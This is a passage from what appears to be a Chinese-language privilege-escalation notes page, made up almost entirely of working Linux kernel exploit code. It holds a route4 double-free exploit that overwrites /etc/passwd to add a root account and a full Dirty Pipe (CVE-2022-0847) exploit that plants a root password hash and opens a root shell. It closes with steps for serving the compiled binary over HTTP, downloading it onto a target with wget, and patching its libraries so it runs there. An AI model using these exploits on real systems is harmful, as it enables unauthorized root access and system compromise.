  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);

  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle << 8) + handle, flag);
}

uint32_t calc_handle(uint32_t from, uint32_t to) {
  uint32_t handle = to;

  assert(from <= 0xff && to <= 0xff);
  handle |= from << 16;

  if (((handle & 0x7f00) | handle) != handle)
    return 0;

  if (handle == 0 || (handle & 0x8000))
    return 0;
  return handle;
}

void *delete_tc_(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf("size of sender address is wrong\n");
  }
  return start;
}

void delete_tc(int sockfd, uint32_t handle) {
  delete_tc_(sockfd, ((handle) << 8) + (handle));
}

// basic for spray
int add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len,
                 int spray_count) {
  assert(spray_len * spray_count < 0x3000);
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x4000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);
  struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);
  struct tcf_ematch_tree_hdr tree_hdr = {.nmatches = spray_count / 2,
                                         .progid = 0};

  addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &tree_hdr, sizeof(tree_hdr));
  struct rtattr *rt_match_tail =
      addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);

  char *data = malloc(0x3000);
  for (int i = 0; i < tree_hdr.nmatches; i++) {
    char *current;
    memset(data, 0, 0x3000);
    struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;
    hdr->kind = TCF_EM_META;
    hdr->flags = TCF_EM_REL_AND;

    current = data + sizeof(*hdr);

    struct tcf_meta_hdr meta_hdr = {
        .left.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
        .right.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
    };

    current += addattr(current, TCA_EM_META_HDR, &meta_hdr, sizeof(hdr));
    current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);
    current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);

    addattr_l(msg, 0x4000, i + 1, data, current - data);
  }

  addattr_nest_end(msg, rt_match_tail);
  addattr_nest_end(msg, ema_tail);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  sendmsg(fd, &msgh, 0);
  free(data);
  free(start);
  return 1;
}

void *delete_tc_basic(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x1000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf("size of sender address is wrong\n");
  }

  return start;
}

void *slow_write() {
  printf("start slow write\n");
  clock_t start, end;
  int fd = open("./uaf", 1);

  if (fd < 0) {
    perror("error open uaf file");
    exit(-1);
  }

  unsigned long int addr = 0x30000000;
  int offset;
  for (offset = 0; offset < 0x80000 / 20; offset++) {
    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (r < 0) {
      printf("allocate failed at 0x%x\n", offset);
    }
  }

  assert(offset > 0);

  void *mem = (void *)(addr);
  memcpy(mem, "hhhhh", 5);

  struct iovec iov[20];
  for (int i = 0; i < 20; i++) {
    iov[i].iov_base = mem;
    iov[i].iov_len = offset * 0x1000;
  }

  run_write = 1;
  start = clock();
  // 2GB max
  if (writev(fd, iov, 20) < 0) {
    perror("slow write");
  }
  end = clock();
  double spent = (double)(end - start) / CLOCKS_PER_SEC;
  printf("write done, spent %f s\n", spent);
  run_write = 0;
}

void *write_cmd() {
  // user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash
  char data[1024] =
      "user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash";
  // struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};
  struct iovec iov = {.iov_base = content, .iov_len = strlen(content)};

  while (!run_write) {
  }
  run_spray = 1;
  if (writev(overlap_a, &iov, 1) < 0) {
    printf("failed to write\n");
  }
  printf("should be after the slow write\n");
}

void pre_exploit() {
  adjust_rlimit();
  use_temporary_dir();
  setup_namespace();
}

void exploit() {
  char buf[2 * PAGE_SIZE] = {};
  char msg[0x10] = {};
  char *spray;
  int cc;
  struct rlimit old_lim, lim, new_lim;

  // Get old limits
  if (getrlimit(RLIMIT_NOFILE, &old_lim) == 0)
    printf("Old limits -> soft limit= %ld \t"
           " hard limit= %ld \n",
           old_lim.rlim_cur, old_lim.rlim_max);
  pin_on_cpu(0);
  printf("starting exploit, num of cores: %d\n", cpu_cores);

  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);

  // wait for parent
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }
  // allocate the vulnerable object
  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);

  // ask parent to keep spraying
  if (write(pipe_parent[1], "OK", 2) != 2) {
    err(1, "write to child");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }

  // free the object, to free the slab
  add_tc_(sockfd, 0x11, 0x12, 0, NLM_F_CREATE);

  // wait for the vulnerable object being freed
  usleep(500 * 1000);
  printf("freed the filter object\n");
  // sync
  if (write(pipe_parent[1], "OK", 2) != 2) {
    err(1, "write to child");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }

  usleep(1000 * 1000);

  for (int i = 0; i < spray_num_1; i++) {
    pin_on_cpu(i % cpu_cores);
    fds[i] = open("./data2", 1);
    assert(fds[i] > 0);
  }

  // double free route4, which will free the file
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  usleep(1000 * 100);

  // should not sleep too long, otherwise file might be claimed by others
  printf("double free done\n");
  printf("spraying files\n");

  // the following is to figure out which file is freed
  for (int i = 0; i < spray_num_2; i++) {
    pin_on_cpu(i % cpu_cores);
    fd_2[i] = open("./uaf", 1);
    assert(fd_2[i] > 0);
    for (int j = 0; j < spray_num_1; j++) {
      if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==
          0) {
        printf("found overlap, id : %d, %d\n", i, j);
        overlap_a = fds[j];
        overlap_b = fd_2[i];

        pthread_t pid, pid2;
        pthread_create(&pid, NULL, slow_write, NULL);
        pthread_create(&pid2, NULL, write_cmd, NULL);

        while (!run_spray) {
        }

        close(overlap_a);
        close(overlap_b);
        printf("closed overlap\n");

        usleep(1000 * 100);

        int spray_num = 4096;
        write(pipe_file_spray[0][1], &spray_num, sizeof(int));
        if (read(pipe_file_spray[1][0], &msg, 2) != 2) {
          err(1, "read from file spray");
        }
        overlapped = true;
      }
    }
    if (overlapped)
      break;
  }

  sleep(3);
  while (run_write) {
    sleep(1);
  }

  if (!overlapped) {
    printf("no overlap found :(...\n");
    write(pipe_main[1], "\xff", 1);
  } else {
    int xx = open(target, 0);
    char buf[0x100] = {};
    // check if user in the passwd
    read(xx, buf, 0x30);
    if (!strncmp(buf, "user", 4)) {
      write(pipe_main[1], "\x00", 1);
    } else {
      printf("not successful : %s\n", buf);
      write(pipe_main[1], "\xff", 1);
    }
  }
  while (1) {
    sleep(1000);
  }
}

void post_exploit() {}

// this poc assume we have a heap address leaked
int run_exp() {
  if (pipe(pipe_parent) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_child) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_defrag) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_file_spray[0]) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_file_spray[1]) == -1) {
    err(1, "fail to create pipes\n");
  }

  cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

  if (fork() == 0) {
    // thread for spraying file we want to overwrite
    adjust_rlimit();
    int spray_num = 0;
    if (read(pipe_file_spray[0][0], &spray_num, sizeof(int)) < sizeof(int)) {
      err(1, "read file spray");
    }

    printf("got cmd, start spraying %s\n", target);
    spray_num = 4096;
    if (fork() == 0) {
      for (int i = 0; i < spray_num; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      while (1) {
        sleep(10000);
      }
    }

    for (int i = 0; i < spray_num; i++) {
      pin_on_cpu(i % cpu_cores);
      open(target, 0);
    }
    printf("spray done\n");
    write(pipe_file_spray[1][1], "OK", 2);
    while (1) {
      sleep(10000);
    }
    exit(0);
  }

  if (fork() == 0) {
    pin_on_cpu(0);
    pre_exploit();
    exploit();
    post_exploit();
  } else {
    sleep(2);
    if (fork() == 0) {
      // do the defragmentation to exhaust all file slabs
      // for cross cache
      adjust_rlimit();
      for (int i = 0; i < 10000; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      printf("defrag done\n");
      if (write(pipe_defrag[1], "OK", 2) != 2) {
        err(1, "failed write defrag");
      }
      while (1) {
        sleep(1000);
      }
    } else {
      // memory spray thread
      setup_namespace();
      pin_on_cpu(0);
      int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);
      assert(sprayfd != -1);
      add_qdisc(sprayfd);

      char msg[0x10] = {};
      char payload[256] = {};
      memset(payload + 0x10, 'A', 256 - 0x10);

      if (read(pipe_defrag[0], msg, 2) != 2) {
        err(1, "failed read defrag");
      }

      // if the exploit keeps failing, please tune the middle and end
      int middle = 38;
      int end = middle + 40;

      // preparing for cross cache
      for (int i = 0; i < middle; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }

      add_tc_basic(sprayfd, middle + 1, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 2, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 3, payload, 193, 32);
      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      // allocate route4
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, "read from parent");
      }
      // add_tc_basic(sprayfd, middle+2, payload, 129, 32);

      // prepare another part for cross cache
      for (int i = middle + 2; i < end; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }
      printf("spray 256 done\n");

      for (int i = 1; i < end - 24; i++) {
        // prevent double free of 192
        // and being reclaimed by others
        if (i == middle || i == middle + 1)
          continue;
        delete_tc_basic(sprayfd, i + 1);
      }
      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      // free route4 here
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, "read from parent");
      }
      // if (cpu_cores == 1) sleep(1);
      delete_tc_basic(sprayfd, middle + 2);
      delete_tc_basic(sprayfd, middle + 3);
      delete_tc_basic(sprayfd, 1);
      for (int i = middle + 2; i < end; i++) {
        delete_tc_basic(sprayfd, i + 1);
      }

      printf("256 freed done\n");

      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      while (1) {
        sleep(1000);
      }
    }
  }
}

int main(int argc, char **argv) {
  global = (char *)mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_ANON, -1, 0);
  memset(global, 0, 0x2000);

  self_path = global;
  snprintf(self_path, 0x100, "%s/%s", get_current_dir_name(), argv[0]);
  printf("self path %s\n", self_path);

  int fd = open(target, 0);
  content = (char *)(global + 0x100);
  strcpy(content, overwrite);
  read(fd, content + strlen(overwrite), 0x1000);
  close(fd);

  assert(pipe(pipe_main) == 0);

  printf("prepare done\n");

  if (fork() == 0) {
    run_exp();
    while (1) {
      sleep(10000);
    }
  }

  char data;
  read(pipe_main[0], &data, 1);
  if (data == 0) {
    printf("succeed\n");
  } else {
    printf("failed\n");
  }
}
```
利用
```Shell
gcc exploit.c -lpthread -o exploit
./exploit
su user
# passwd: user
id
# uid=0(user) gid=0(root) groups=0(root)
```

### CVE-2022-0847
脏管道，受影响的内核版本：`>= 5.8` 且 `< 5.16.11 / 5.15.25 / 5.10.102`
```C
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main() {
	const char *const path = "/etc/passwd";

        printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron 
        printf("Setting root password to \"aaron\"...\n");
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	char *argv[] = {"/bin/sh", "-c", "(echo aaron; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

        printf("system() function call seems to have failed :(\n");
	return EXIT_SUCCESS;
}
```
利用方法
```Shell
gcc exploit.c -o exploit
./exploit
```
目标机器上没有安装 `gcc` ，需要现在自己的机器上编译可执行文件
```Shell
gcc exploit.c -o exploit
python3 -m http.server 7331
```
靶机上下载执行
```Shell
wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
# ./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exploit)
```
提示库文件版本不一致无法执行
查看一下可执行文件的信息
```Shell
ldd exploit
# linux-vdso.so.1 (0x00007ffe61bf3000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcf3a7b1000)
# /lib64/ld-linux-x86-64.so.2 (0x00007fcf3a9ac000)
```
先在主机上手动给二进制文件打补丁
```Shell
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/
cp /lib64/ld-linux-x86-64.so.2 /tmp/
# 一般库
patchelf --replace-needed libc.so.6 /tmp/libc.so.6 ./exploit
# 动态链接库
patchelf --set-interpreter /tmp/ld-linux-x86-64.so.2 ./exploit
```
再将库文件一并传到靶机上
```Shell
cd /tmp
python3 -m http.server 7331
```
靶机上下载，放到同样的位置
```Shell
cd /tmp
wget http://192.168.1.26:7331/libc.so.6
wget http://192.168.1.26:7331/ld-linux-x86-64.so.2
chmod 777 ld-linux-x86-64.so.2 libc.so.6
```
重新传可执行文件再执行
```Shell
wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
```
提权成功